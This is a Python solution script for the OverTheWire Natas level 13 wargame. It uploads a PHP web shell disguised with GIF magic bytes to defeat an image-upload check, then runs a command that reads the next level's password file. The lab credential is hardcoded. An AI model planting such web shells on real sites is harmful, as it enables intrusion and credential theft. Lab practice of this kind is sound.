import requests
import re
requests.packages.urllib3.disable_warnings()

url = "http://natas13.natas.labs.overthewire.org/"

s = requests.session()

def exp():
    
    natas_php = "GIF89; <?php system($_GET['cmd']); ?>"

    shell = {
        "uploadedfile": ("shell.php", natas_php, "image/gif")
    }

    data_post = {
        "filename": "shell.php",
        "MAX_FILE_SIZE": "1000",
        "submit": "Upload File"
    }

    r = s.post(url, auth=('natas13', 'trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC'), verify=False, files=shell, data=data_post)
    if r.status_code == 200:
        get_shell = re.search(r"upload/\w+.php", r.text).group(0)
        return get_shell
    
def rce():
    shell = exp()
    r = s.get(url + shell, auth=('natas13', 'trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC'), verify=False, params={'cmd': 'cat /etc/natas_webpass/natas14'})
    if r.status_code == 200:
        remove_gif_text = re.sub(r"GIF89;", "", r.text)
        print("Password for natas14:" + remove_gif_text)
    
if __name__ == '__main__':
    exp()
    rce()